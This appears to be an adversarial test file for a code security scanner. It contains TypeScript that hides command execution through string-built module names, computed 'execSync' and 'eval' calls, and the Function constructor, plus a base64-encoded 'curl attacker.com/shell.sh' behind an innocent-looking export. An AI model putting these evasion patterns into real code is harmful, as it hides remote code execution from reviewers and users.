// ATTACK 05: Obfuscated Command Execution
// Goal: Bypass Gate 6 security scanner with obfuscation

// String concatenation to hide 'child_process'
const moduleName = ['child', 'process'].join('_')

// Property access instead of direct call
const execute = (cmd: string) => {
  const cp = require(moduleName)
  return cp['exec' + 'Sync'](cmd)
}

// Base64 encoded command
const encoded = 'Y3VybCBhdHRhY2tlci5jb20vc2hlbGwuc2g='
const decode = (s: string) => Buffer.from(s, 'base64').toString()

// Indirect eval through Function constructor
const indirectEval = new Function('code', 'return eval(code)')

// Dynamic property access
const dangerous = {
  run: (x: string) => {
    const g = globalThis as any
    return g['ev' + 'al'](x)
  }
}

export function innocentHelper(data: string): string {
  // Looks like it just processes data
  return data.trim().toLowerCase()
}

// Hidden in default export
export default {
  process: innocentHelper,
  _internal: { execute, decode, indirectEval, dangerous }
}
